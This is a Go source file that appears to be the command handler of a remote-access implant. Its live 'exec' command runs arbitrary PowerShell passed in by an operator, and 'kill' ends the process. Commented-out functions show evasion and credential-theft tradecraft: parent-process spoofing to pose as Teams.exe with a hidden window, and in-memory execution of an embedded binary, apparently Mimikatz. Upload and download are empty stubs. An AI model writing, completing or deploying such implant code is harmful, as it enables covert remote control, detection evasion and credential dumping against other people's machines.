package internal

import (
	"bytes"
	_ "embed"
	"io"
	"os"
	"os/exec"
)

type FuncPtr func([]string) ([]byte, error)

var FuncPtrMap = map[string]FuncPtr{
	//	"whoami": Whoami,
	"exec": Exec,
	//	"mimi":   Mimi,
	"kill": Kill,
}

// func Whoami(args []string) ([]byte, error) {
// 	var (
// 		stdErrBuf bytes.Buffer
// 		stdOutBuf bytes.Buffer
// 	)
// 	cmd := exec.Command("powershell", "-C", "whoami")
// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	pid, err := GetPid("Teams.exe")
// 	if err != nil {
// 		return []byte(fmt.Sprintf("Failed to spoof PPID: %s", err.Error())), nil
// 	}
// 	err = SpoofPPID(pid, cmd)
// 	if err != nil {
// 		return []byte(fmt.Sprintf("Failed to spoof PPID: %s", err.Error())), nil
// 	}
// 	cmd.Stderr = stdErr(cmd, &stdErrBuf)
// 	cmd.Stdout = stdOut(cmd, &stdOutBuf)
// 	err = cmd.Run()
// 	if err != nil {
// 		return []byte("Error in cmd.Run()"), nil
// 	}
// 	cmd.Start()
// 	return stdOutBuf.Bytes(), nil
// }

func Exec(args []string) ([]byte, error) {
	cmdArgs := append([]string{"-C"}, args...)
	cmd := exec.Command("powershell", cmdArgs...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

// func Mimi(args []string) ([]byte, error) {
// 	bin, err := memexec.New(MK)
// 	if err != nil {
// 		return nil, err
// 	}
// 	defer bin.Close()
// 	cmd := bin.Command(args...)
// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	return cmd.CombinedOutput()
// }

func Upload(args []string) ([]byte, error) {
	return nil, nil
}

func Download(args []string) ([]byte, error) {
	return nil, nil
}

func Kill(args []string) ([]byte, error) {
	os.Exit(0)
	return nil, nil
}

func stdOut(cmd *exec.Cmd, buf *bytes.Buffer) io.Writer {
	return io.MultiWriter(buf)
}

func stdErr(cmd *exec.Cmd, buf *bytes.Buffer) io.Writer {
	return io.MultiWriter(buf)
}
